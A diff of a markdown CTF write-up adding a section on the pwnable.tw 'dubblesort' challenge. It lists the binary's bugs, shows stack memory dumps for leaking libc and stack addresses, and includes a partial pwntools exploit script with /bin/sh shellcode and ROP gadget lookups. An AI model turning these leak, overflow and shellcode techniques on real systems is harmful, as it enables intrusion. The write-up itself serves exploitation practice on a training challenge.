@@ -679,7 +679,7 @@ and jump to whatever resides there. \
 Hence, we shall overwrite `.fini_array[0] = leave_gadget`, and `.fini_array[1] = RA`.
 The easiest way to exploit this would probably be a ROP chain, where the above `RA` stands for the first gadget's address.
 
-#### Solution
+### Solution
 
 ```python
 #!/usr/bin/python3
@@ -794,10 +794,247 @@ if __name__ == '__main__':
 
 ## dubblesort
 
-TODO
+```bash
+$ checksec ./dubblesort
+[*] '/home/itay/projects/pwnable_tw/dubblesort/dubblesort'
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+$ file dubblesort
+dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped
+```
+
+Full mitigations 32-bit binary.
+
+### Overview
+
+The program asks for username, number of elements to sort, and the elements themselves. 
+It then produces an output of the sorted elements array. \
+There are many sus notes:
+
+1. The program reads `0x40` bytes into the `0x40` name buffer. Hence, no room for the null terminator, producing an untruncated string. It can be useful in order to leak the preceding bytes. Another vuln might be the fact that this array isn't initialized to `\x00`.
+
+2. No checks regarding the elements array size. It can be both a very large number, or the special case of `0`. 
+
+3. While reading the numbers array, they are being stored within `int[8]` static array on the stack. What would happen if we'd read more than 8 elements..? Probably OOB-RW.
+
+4. Related to above - within the reading loop's body, there seems to be a redundant assignment of stack local variables. However, if we can corrupt the values past the `int[8]` array, this assignment may have some interesting impact.
+
+5. Also regarding the numbers reading - notice that it uses the `"%u"` format specifier to read the numbers. However, in case we would insert some unlegitimate byte, such as `'A'`, parsing won't occur, and the number's value would remain uninitialized. Indeed, when I've entered `A` character as the number, the program had leaked tons of memory as `Result`.
+
+6. Although defined with unsigned format specifier, the numbers defined as `int`s, and can be negative. 
+
+7. Within the process routine, the `size` is defined as `int`, not unsigned.
+
+
+### Exploitation
+
+#### Debugging
+
+Because we're given a partciular version of `libc`, we shall patch the binary to use it instead - and mimic the remote environment accurately.
+
+```bash
+patchelf --replace-needed libc.so.6 ./libc.so.6 "./dubblesort"
+```
+
+However, this approach didn't seem to work. 
+Hence, I've set a basic docker debugging environment to run the binary at, storing the new libc within the expected path. 
+
+
+#### Read Primitive
+
+Because the primitive we have is linear stack overflow, we must achieve a stack read primitive. 
+Leaking `libc` and potentially the program's base address would probably also serve us within the exploitation. \
+Recall the first vuln, where the given `name` string is untruncated. 
+This indeed results with an OOB-R, however - notice the stack canary is the consecutive dword for this name buffer:
+
+```bash
+0xff85b6b0:     0xf6852608      0x00000009      0xff85b71c      0x41414141
+0xff85b6c0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xff85b6d0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xff85b6e0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xff85b6f0:     0x41414141      0x41414141      0x41414141      0xacdfa700
+```
+
+A smart design decision of the stack canary, was to have its `LSB` always set to `\x00`, preventing leaks just like this. 
+Therefore, we won't be able to leak information this way. \
+However, recall there's another bug, as the name array wasn't initialized at all. What if we would send a very short string? \
+Unfortunately, sending an empty buffer (0 bytes) halts the program. Hence, we need to send at least 1 byte in order for the `read` call to be non-blocking. 
+In this example, I've sent a single `b'A'`, which is stored within `0xff8e73cc`. This gives us a partial stack leak primitive:
+
+```bash
+pwndbg> x/20wx $esp
+0xff8e7390:     0x590d9bfa      0xff8e73a8      0xff8e73cc      0x00000000
+0xff8e73a0:     0x00000000      0x00000000      0x00000000      0xf59af000
+0xff8e73b0:     0xf5976570      0xffffffff      0x590d9034      0xf59786d0
+0xff8e73c0:     0xf59af608      0x00000009      0xff8e742c      0xff8e7541
+0xff8e73d0:     0x00000000      0x00000000      0x01000000      0x00000009
+```
+
+Because of the `'%s'` format specifier, 4 bytes would be leaked - `0xff8e7541`. Of course, the LSB is corrupted. 
+However, notice that ASLR doesn't affect the lowest nibble, hence it should be some constant value we can easily brute force. \
+An optimization for the above approach, would be to overwrite up to some other interesting addresses, and by doing so - also leaking `libc` addresses:
+
+```bash
+0xff8e73c0:     0xf59af608      0x00000009      0xff8e742c      0xff8e7541
+0xff8e73d0:     0x00000000      0x00000000      0x01000000      0x00000009
+0xff8e73e0:     0xf5976570      0x00000000      0xf57414be      0xf5953054
+0xff8e73f0:     0xf59704a0      0xf5988f90      0xf57414be      0xf59704a0
+0xff8e7400:     0xff8e7440      0xf597066c      0xf5970b40      0x37ac2f00
+```
+
+In this example, if we would overwrite `0x34` bytes, we would leak stack address, 
+`0xff8e7440`, along with 2 preceding `libc` addresses. 
+Note, that doing this large overwrite is preferred, as this way there's lesser chance of one of the randomized bytes in between to be a null termination, 
+possibly truncation the output and damaging the exploit's statistics. \
+Interestingly, upon remote-debugging the binary, I've noticed the stack layout was completely different. 
+I've sent a single `'A'` character, and got the following:
+
+```bash
+[*] leak: 0xf76dd041
+[*] leak: 0xffef0f21                                                 [*] leak: 0x6f482c2f
+[*] leak: 0x616d2077
+[*] leak: 0x6e20796e
+[*] leak: 0x65626d75
+[*] leak: 0x64207372
+[*] leak: 0x6f79206f
+[*] leak: 0x68772075
+[*] leak: 0x74207461
+[*] leak: 0x6f73206f
+[*] leak: 0x3a207472
+```
+
+This means that the first dword is a libc leak, and the second - a stack leak. \
+Moreover, the preceding string "How many numbers do you what to sort :" actually resides within the stack! 
+Hence, it seems to be copied from the .rodata segment, probably as part of the `FORTIFY_SOURCE` extra runtime checks. 
 
 
 
+#### Arbitrary Stack Write
 
+The main vulnerability of this challenge seems to be the fact that we can write infinite amount of numbers to the 8-slot size array, and sort all of them. \
+This means the primitive is pretty limited - we can write any data we want into the stack, but it would get sorted, being interpreted as 4-byte uints. 
+
+
+### Solution
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+HOST = 'chall.pwnable.tw'
+PORT = 10101
+context.arch='i386'
+BINARY = './dubblesort'
+LIBC = './libc_32.so.6'
+GDB_SCRIPT = '''
+b *main+0x85
+commands
+    p "reading size"
+end
+
+c
+'''
+
+SHELLCODE = '''
+mov ebx, {0}
+xor ecx, ecx
+xor edx, edx
+push 0x0b
+pop eax
+int 0x80
+
+BIN_SH:
+.ascii "/bin/sh"
+.byte 0x00
+'''
+
+# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
+OFFSET_TO_BIN_SH = 0x0e
+
+# Constants
+IS_DEBUG = False 
+IS_REMOTE = True
+
+# Offsets
+NAME_LEAK = 0x1
+
+# Addresses
+libc_rop = ROP(LIBC)
+pop_eax_ret = libc_rop.eax.address
+pop_ebx_ret = libc_rop.ebx.address
+pop_ecx_ret = libc_rop.ecx.address
+pop_edx_ret = libc_rop.edx.address
+leave_ret = libc_rop.find_gadget(['leave']).address
+int_80 = libc_rop.find_gadget(['int 0x80']).address
+log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
+log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
+log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
+log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
+log.info(f'leave_ret: {hex(leave_ret)}')
+log.info(f'int_80: {hex(int_80)}')
+
+def unsigned(n, bitness=32):
+    if n < 0:
+        n = n + 2**bitness
+    return n
+
+def pad(buf, alignment, delimiter=b'\x00'):
+    if (len(buf) % alignment) == 0:
+        return buf
+
+    extra = (alignment - (len(buf) % alignment)) * delimiter
+    return buf + extra
+
+def splitted(buf, n):
+    for i in range(0, len(buf), n):
+        yield buf[i: i + n]
+
+def recvPointer(p, sizeof_ptr = 4):
+    leak = p.recv(sizeof_ptr)
+    assert(len(leak) == sizeof_ptr)
+    leak = u32(leak)
+    return leak
+
+def getLeaks(p):
+    p.recvuntil(b'What your name :')
+    name = b'A' * NAME_LEAK
+    p.send(name)
+    p.recvuntil(b'Hello ')
+    
+    libc_leak = recvPointer(p)
+    log.info(f'libc_leak: {hex(libc_leak)}')
+    
+    stack_leak = recvPointer(p)
+    log.info(f'stack_leak: {hex(stack_leak)}')
+    
+    p.recvuntil(b',How many numbers do you what to sort :')
+    return libc_leak, stack_leak
+
+def exploit(p):
+    libc_leak, stack_leak = getLeaks(p)
+
+
+def main():
+    if IS_DEBUG:
+        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
+    else:
+        if IS_REMOTE:
+            p = remote(HOST, PORT)
+        else:
+            p = process(BINARY)
+
+    exploit(p)
+
+    log.info('Win')
+    p.interactive()
+
+if __name__ == '__main__':
+    main()
+```
 
 [elf-start]: http://www.dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html
